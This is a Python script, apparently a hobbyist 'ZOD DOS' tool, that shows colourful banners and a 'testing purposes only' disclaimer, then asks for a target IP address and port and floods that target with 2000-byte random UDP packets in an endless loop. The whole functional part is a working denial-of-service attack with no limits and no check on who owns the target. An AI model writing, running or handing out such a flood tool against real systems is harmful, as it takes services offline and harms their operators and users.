import sys
from pystyle import *
import os
import time
import socket
import random
sys.stdout.write("\x1b]2;ZOD DOS\x07")
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(2000)
os.system("cls")
print(Colorate.Horizontal(Colors.red_to_black, '''                                  
                                  ▄▄                                    
           ███▀▀▀███              ▀███     ▀███▀▀▀██▄   ▄▄█▀▀██▄  ▄█▀▀▀█▄█
           █▀   ███                 ██       ██    ▀██▄██▀    ▀██▄██    ▀█
           ▀   ███   ▄██▀██▄   ▄█▀▀███       ██     ▀███▀      ▀█████▄    
              ███   ██▀   ▀██▄██    ██       ██      ███        ██ ▀█████▄
             ███   ▄██     █████    ██       ██     ▄███▄      ▄██     ▀██
            ███   ▄███▄   ▄██▀██    ██       ██    ▄██▀██▄    ▄██▀█     ██
           █████████ ▀█████▀  ▀████▀███▄   ▄████████▀   ▀▀████▀▀ █▀█████▀ 
           ''', 3))
time.sleep(2)
Write.Print(f'''                         =========================================
                         =                                       =
                         =            Made by zodarixx           =
                         =                                       =
                         =               @zodarixx               =
                         =   https://github.com/zodarixxbyspass  =
                         ========================================='''
, Colors.blue_to_green, interval=0.0025)
time.sleep(1)
print(Colors.red, '''
                  
                  
    ⚠ This software is for testing purposes only ⚠. I am in no way responsible for what you do with this software.''')
time.sleep(1)
ip = input('''                          
                                              
                                               
                                                                               
    \033[0m Please enter the IP  : ''')
port = int(input("    \033[0m Please enter the Port  : "))
os.system("cls") ; print(Colorate.Horizontal(Colors.red_to_black, '''                                  
                                  ▄▄                                    
           ███▀▀▀███              ▀███     ▀███▀▀▀██▄   ▄▄█▀▀██▄  ▄█▀▀▀█▄█
           █▀   ███                 ██       ██    ▀██▄██▀    ▀██▄██    ▀█
           ▀   ███   ▄██▀██▄   ▄█▀▀███       ██     ▀███▀      ▀█████▄    
              ███   ██▀   ▀██▄██    ██       ██      ███        ██ ▀█████▄
             ███   ▄██     █████    ██       ██     ▄███▄      ▄██     ▀██
            ███   ▄███▄   ▄██▀██    ██       ██    ▄██▀██▄    ▄██▀█     ██
           █████████ ▀█████▀  ▀████▀███▄   ▄████████▀   ▀▀████▀▀ █▀█████▀ 
           ''', 3)) ; print(" \n")
print("\033[1;33m<<===[: Attention ca arrive mon sos :]===>>")
time.sleep(5)
os.system("cls")
print("\033[1;35m >>>> Attack has been start in \n")
time.sleep(1)
print("\033[1;32m[: 5 :]")
time.sleep(1)
print("\033[1;34m[: 4 :]")
time.sleep(1)
print("\033[1;31m[: 3 :]")
time.sleep(1)
print("\033[1;39m[: 2 :]")
time.sleep(1)
print("\033[1;30m[: 1 :]")
time.sleep(3)
os.system("cls")
time.sleep(2)

sent = 0
while True:
    sock.sendto(bytes, (ip, port))
    sent = sent + 2
    port = port
    print("\033[1;92mpacket sent to %s on port:%s" % (ip, port))